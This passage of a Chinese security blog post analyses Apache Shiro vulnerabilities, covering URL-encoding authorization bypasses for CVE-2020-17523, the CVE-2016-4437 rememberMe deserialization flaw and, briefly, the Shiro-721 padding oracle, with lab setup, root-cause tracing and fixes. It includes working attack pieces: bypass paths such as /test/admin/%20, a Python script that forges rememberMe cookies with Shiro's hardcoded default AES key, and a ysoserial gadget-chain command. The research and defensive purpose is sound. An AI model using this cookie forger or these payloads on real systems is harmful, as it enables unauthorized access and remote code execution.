<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>通杀版本</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test/admin/%<span class="number">20</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/28/Web_19/20210622163002.png" alt="image-20210622163001248"></p>
+<p>springboot高版本</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/test/</span>admin<span class="regexp">/%2e    或    /</span>test<span class="regexp">/admin/</span>%<span class="number">2</span>e</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/28/Web_19/20210622163112.png" alt="image-20210622163112082"></p>
+<h4 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>通杀版本的绕过，其原因和<code>%3b</code>差不多，都是Shiro规则匹配特殊字符缺陷的原因</p>
+<p>而针对<code>/test/admin/%2e</code>，request.getServletPath处理后返回<code>/test/admin/</code>，同样因为Shiro-682原因，会去掉最后的<code>/</code>导致bypass</p>
+<h4 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p><img src="/2021/06/28/Web_19/20210622171227.png" alt="image-20210622171226555"></p>
+<p>解决空格分离的问题</p>
+<p><img src="/2021/06/28/Web_19/20210622171519.png" alt="image-20210622171518753"></p>
+<p>Shiro-682的修复改成了if/else判断</p>
+<h3 id="权限绕过总结"><a href="#权限绕过总结" class="headerlink" title="权限绕过总结"></a>权限绕过总结</h3><p>经过上文的分析，可以看到权限绕过基本就在于Shiro和Spring到tomcat解析URL差异性上，Shiro用自己的逻辑去判断请求的地址，但是忽略了tomcat解析包容性的问题。导致绕过Shiro判断，而Spring能够正常解析。</p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="CVE-2016-4437（Shiro-550）"><a href="#CVE-2016-4437（Shiro-550）" class="headerlink" title="CVE-2016-4437（Shiro-550）"></a>CVE-2016-4437（Shiro-550）</h3><h4 id="影响范围-5"><a href="#影响范围-5" class="headerlink" title="影响范围"></a>影响范围</h4><ul>
+<li>Apache Shiro &lt; 1.2.4</li>
+</ul>
+<h4 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>下载Shiro并切换到漏洞版本</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/apache/shiro.gitcd shirogit checkout shiro-root-<span class="number">1.2</span>.<span class="number">4</span></span><br></pre></td></tr></table></figure>
+
+<p>pom.xml修改，添加</p>
+<p>jstl是为了jsp正常运行，commons-collections4引入反序列化利用链</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>    <span class="comment">&lt;!--  这里需要将jstl设置为1.2 --&gt;</span>    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span>    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span> <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>idea导入<code>shiro/samples/web</code>，等待idea自动下载导入项目依赖的包</p>
+<p>Edit Configurations 添加TomcatServer，并添加Deployment</p>
+<p><img src="/2021/06/28/Web_19/20210624150142.png" alt="image-20210624150056867"></p>
+<p><img src="/2021/06/28/Web_19/20210624150217.png" alt="image-20210624150216734"></p>
+<p>然后调试运行即可</p>
+<p><img src="/2021/06/28/Web_19/20210624151018.png" alt="image-20210624151014898"></p>
+<h4 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>burp插件发现默认key</p>
+<p><img src="/2021/06/28/Web_19/20210624154428.png" alt="image-20210624154426736"></p>
+<p>rememberMe cookie生成脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sysimport base64import uuidfrom random <span class="keyword">import</span> Randomimport subprocessfrom Crypto.Cipher <span class="keyword">import</span> AES key  =  <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>mode =  AES.MODE_CBCIV   = uuid.uuid4().bytesencryptor = AES.new(base64.b64decode(key), mode, IV) payload=base64.b64decode(sys.argv[<span class="number">1</span>])BS   = AES.block_sizepad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()payload=pad(payload) print(base64.b64encode(IV + encryptor.encrypt(payload)))</span><br></pre></td></tr></table></figure>
+
+<p>yso payload生成</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-<span class="number">0.0</span><span class="number">.6</span>-SNAPSHOT-all.jar CommonsCollections2 <span class="string">"calc"</span>|<span class="built_in">base64</span> -w0|sed ':<span class="built_in">label</span>;N;s/\n//;b <span class="built_in">label</span>'</span><br></pre></td></tr></table></figure>
+
+<p>然后生成用上面脚本生成cookie</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">py</span> -<span class="number">3</span> encode.<span class="keyword">py</span> &lt;yso payload&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/28/Web_19/20210624161828.png" alt="image-20210624161827948"></p>
+<p>也可以使用图形化工具，一键利用，<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated" target="_blank" rel="noopener">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></p>
+<p><img src="/2021/06/28/Web_19/20210624154644.png" alt="image-20210624154642996"></p>
+<h4 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><h5 id="cookie生成"><a href="#cookie生成" class="headerlink" title="cookie生成"></a>cookie生成</h5><p>处理rememberme的cookie的类为<code>org.apache.shiro.web.mgt.CookieRememberMeManager</code>，它继承自<code>org.apache.shiro.mgt.AbstractRememberMeManager</code>，其中在AbstractRememberMeManager中定义了加密cookie所需要使用的密钥，可以看到密匙是直接硬编码写死的</p>
+<p><img src="/2021/06/28/Web_19/20210624171323.png" alt="image-20210624171322168"></p>
+<p>成功登录时，会进入onSuccessfulLogin方法</p>
+<p><img src="/2021/06/28/Web_19/20210624171438.png" alt="image-20210624171437672"></p>
+<p>当rememberMe设置为on时，最后会进入两个参数的rememberIdentity函数，accountPrincipals为用户权限类型</p>
+<p><img src="/2021/06/28/Web_19/20210624210041.png" alt="image-20210624210040095"></p>
+<p>跟进convertPrincipalsToBytes，this.serialize调用原生序列化类序列化数据，序列化之后通过encrypt函数加密</p>
+<p><img src="/2021/06/28/Web_19/20210624210400.png" alt="image-20210624210359887"></p>
+<p>encrypt调用cipherService.encrypt，最终返回bytes值</p>
+<p><img src="/2021/06/28/Web_19/20210624210544.png" alt="image-20210624210543832"></p>
+<p>跟进cipherService.encrypt</p>
+<p><img src="/2021/06/28/Web_19/20210624210710.png" alt="image-20210624210709364"></p>
+<p>调试可以发现这里使用AES加密，CBC模式，填充方式为PKCS5Padding</p>
+<p><img src="/2021/06/28/Web_19/20210624210743.png" alt="image-20210624210742440"></p>
+<p>iv的值跟进generateInitializationVector，会发现是随机生成的16位字符</p>
+<p><img src="/2021/06/28/Web_19/20210624210912.png" alt="image-20210624210911168"></p>
+<p>又进入一个encrypt函数，会进入第一个if逻辑，可以看到output是由16位iv加AES密文，最后返回Util.bytes(output)</p>
+<p><img src="/2021/06/28/Web_19/20210624211104.png" alt="image-20210624211103305"></p>
+<p>然后回到rememberIdentity，bytes即由16位iv加AES密文构成<img src="/2021/06/28/Web_19/20210624211317.png" alt="image-20210624211317251"></p>
+<p>rememberSerializedIdentity为抽象类，在<code>org.apache.shiro.web.mgt.CookieRememberMeManager</code>实现，可以看到这里设置cookie为base64过后的bytes</p>
+<p><img src="/2021/06/28/Web_19/20210624211521.png" alt="image-20210624211520917"></p>
+<h5 id="cookie解析"><a href="#cookie解析" class="headerlink" title="cookie解析"></a>cookie解析</h5><p><code>org\apache\shiro\mgt\AbstractRememberMeManager.java</code>中getRememberedPrincipals处理rememberMe</p>
+<p><img src="/2021/06/28/Web_19/20210628155306.png" alt="image-20210628155257906"></p>
+<p>跟进getRememberedSerializedIdentity，base64解码rememberMe值</p>
+<p><img src="/2021/06/28/Web_19/20210628155430.png" alt="image-20210628155429296"></p>
+<p>继续跟进convertBytesToPrincipals</p>
+<p><img src="/2021/06/28/Web_19/20210628155541.png" alt="image-20210628155540222"></p>
+<p>deserialize调用默认的readObject方法</p>
+<p><img src="/2021/06/28/Web_19/20210628155940.png" alt="image-20210628155939610"></p>
+<h4 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><ol>
+<li>更改默认密匙</li>
+<li>动态生成密匙，不用自己提供。官方提供org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey()方法来进行AES的密钥生成</li>
+</ol>
+<h3 id="CVE-2019-12422（Shiro-721）"><a href="#CVE-2019-12422（Shiro-721）" class="headerlink" title="CVE-2019-12422（Shiro-721）"></a>CVE-2019-12422（Shiro-721）</h3><h4 id="影响范围-6"><a href="#影响范围-6" class="headerlink" title="影响范围"></a>影响范围</h4><ul>
+<li>Apache Shiro &lt; 1.4.2</li>
+</ul>
+<h4 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/apache/shiro.git</span></span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root<span class="number">-1.4</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>
+
+<p>然后配置好idea的tomcat就可以了</p>
+<p>详细复现和分析可以查看，<a href="https://yinwc.github.io/2021/06/01/shiro721漏洞复现/，iv需要爆破，时间比较久就没有复现了，懒" target="_blank" rel="noopener">https://yinwc.github.io/2021/06/01/shiro721漏洞复现/，iv需要爆破，时间比较久就没有复现了，懒</a> :P</p>
+<p>大概原理及利用Padding Oracle Attack，针对AES中的CBC加密，修改AES解密后的值为想要的内容，就可以反序列化进入garget</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a href="https://www.anquanke.com/post/id/240033" target="_blank" rel="noopener">Shiro 权限绕过的历史线（上）</a></li>
+<li><a href="https://xz.aliyun.com/t/7964" target="_blank" rel="noopener">Apache Shiro权限绕过漏洞分析(CVE-2020-11989)</a></li>
+<li><a href="https://www.anquanke.com/post/id/240202" target="_blank" rel="noopener">Shiro 权限绕过的历史线（下）</a></li>
+<li><a href="https://xz.aliyun.com/t/7544" target="_blank" rel="noopener">Tomcat URL解析差异性导致的安全问题</a></li>
+<li><a href="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-反序列化漏洞/" target="_blank" rel="noopener">Shiro 1.2.4 反序列化漏洞</a></li>
+<li><a href="https://xz.aliyun.com/t/6493" target="_blank" rel="noopener">Shiro RememberMe 1.2.4远程代码执行漏洞</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Str3am
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://jlkl.github.io/2021/06/28/Web_19/" title="Shiro Vulnerability">https://jlkl.github.io/2021/06/28/Web_19/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"># Web</a>
+              <a href="/tags/Java/" rel="tag"># Java</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/05/20/Web_18/" rel="prev" title="CISCN2021初赛 Web Writeup">
+      <i class="fa fa-chevron-left"></i> CISCN2021初赛 Web Writeup
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#权限绕过"><span class="nav-number">1.</span> <span class="nav-text">权限绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Shiro基础"><span class="nav-number">1.2.</span> <span class="nav-text">Shiro基础</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2020-1957"><span class="nav-number">1.3.</span> <span class="nav-text">CVE-2020-1957</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#影响范围"><span class="nav-number">1.3.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞复现"><span class="nav-number">1.3.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.3.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞修复"><span class="nav-number">1.3.4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2020-11989"><span class="nav-number">1.4.</span> <span class="nav-text">CVE-2020-11989</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#影响范围-1"><span class="nav-number">1.4.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞复现-1"><span class="nav-number">1.4.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞分析-1"><span class="nav-number">1.4.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞修复-1"><span class="nav-number">1.4.4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2020-13933"><span class="nav-number">1.5.</span> <span class="nav-text">CVE-2020-13933</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#影响范围-2"><span class="nav-number">1.5.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞复现-2"><span class="nav-number">1.5.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞分析-2"><span class="nav-number">1.5.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞修复-2"><span class="nav-number">1.5.4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2020-17510"><span class="nav-number">1.6.</span> <span class="nav-text">CVE-2020-17510</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#影响范围-3"><span class="nav-number">1.6.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞分析-3"><span class="nav-number">1.6.2.</span> <span class="nav-text">漏洞分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2020-17523"><span class="nav-number">1.7.</span> <span class="nav-text">CVE-2020-17523</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#影响范围-4"><span class="nav-number">1.7.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞复现-3"><span class="nav-number">1.7.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞分析-4"><span class="nav-number">1.7.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞修复-3"><span class="nav-number">1.7.4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#权限绕过总结"><span class="nav-number">1.8.</span> <span class="nav-text">权限绕过总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反序列化"><span class="nav-number">2.</span> <span class="nav-text">反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2016-4437（Shiro-550）"><span class="nav-number">2.1.</span> <span class="nav-text">CVE-2016-4437（Shiro-550）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#影响范围-5"><span class="nav-number">2.1.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#环境搭建-1"><span class="nav-number">2.1.2.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞复现-4"><span class="nav-number">2.1.3.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞分析-5"><span class="nav-number">2.1.4.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#cookie生成"><span class="nav-number">2.1.4.1.</span> <span class="nav-text">cookie生成</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#cookie解析"><span class="nav-number">2.1.4.2.</span> <span class="nav-text">cookie解析</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞修复-4"><span class="nav-number">2.1.5.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2019-12422（Shiro-721）"><span class="nav-number">2.2.</span> <span class="nav-text">CVE-2019-12422（Shiro-721）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#影响范围-6"><span class="nav-number">2.2.1.</span> <span class="nav-text">影响范围</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞复现-5"><span class="nav-number">2.2.2.</span> <span class="nav-text">漏洞复现</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">3.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Str3am"
+      src="/images/Str3am.jpg">
+  <p class="site-author-name" itemprop="name">Str3am</p>
+  <div class="site-description" itemprop="description">这个人很懒，什么也没留下</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/jlkl" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;jlkl" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:str3am@qq.com" title="E-Mail → mailto:str3am@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Friends
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://0xmj.github.io/" title="http:&#x2F;&#x2F;0xmj.github.io&#x2F;" rel="noopener" target="_blank">Mang0</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/sn1per/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;sn1per&#x2F;" rel="noopener" target="_blank">Sn1per</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Str3am</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="Symbols count total">295k</span>
+</div> 
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment-precise-range-plugin@1.3.0/moment-precise-range.min.js"></script>
+<script>
+  function timer() {
+    var ages = moment.preciseDiff(moment(),moment(20200108,"YYYYMMDD"));
+    ages = ages.replace(/years?/, "年");
+    ages = ages.replace(/months?/, "月");
+    ages = ages.replace(/days?/, "天");
+    ages = ages.replace(/hours?/, "小时");
+    ages = ages.replace(/minutes?/, "分");
+    ages = ages.replace(/seconds?/, "秒");
+    ages = ages.replace(/\d+/g, '<span style="color:#1890ff">$&</span>');
+    div.innerHTML = `我已在此等候你 ${ages}`;
+  }
+  var div = document.createElement("div");
+  //插入到copyright之后
+  var copyright = document.querySelector(".copyright");
+  document.querySelector(".footer-inner").insertBefore(div, copyright.nextSibling);
+  timer();
+  setInterval("timer()",1000)
+</script>
+
+
+
+
+  <script async src="/js/cursor/love.min.js"></script>
+
+
+
+
+  <script src="/js/cursor/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-user"></i>
+        </span>
+        <span class="site-uv" title="我的第  undefined  位朋友，">
+          <span id="busuanzi_value_site_uv"></span>
+        </span>
+      -->
+      <span class="site-uv">
+     我的第  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_uv"></span>  位朋友，
+    </span>
+    <!--
+      <span class="post-meta-divider">|</span>
+    -->
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-eye"></i>
+        </span>
+        <span class="site-pv" title="历经  undefined  次回眸才与你相遇">
+          <span id="busuanzi_value_site_pv"></span>
+        </span>
+      -->
+      <span class="site-pv">
+     历经  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_pv"></span>  次回眸才与你相遇
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el: '#valine-comments',
+      verify: true,
+      notify: true,
+      appId: '3IVY8n0VhhMlAUHBsp34Pxx7-gzGzoHsz',
+      appKey: 'DjdjX2sAzBG2G1G5c6amlBnv',
+      placeholder: "Just go go",
+      avatar: 'mm',
+      meta: guest,
+      pageSize: '10' || 10,
+      visitor: false,
+      lang: 'en' || 'zh-cn',
+      path: location.pathname,
+      recordIP: true,
+      serverURLs: ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
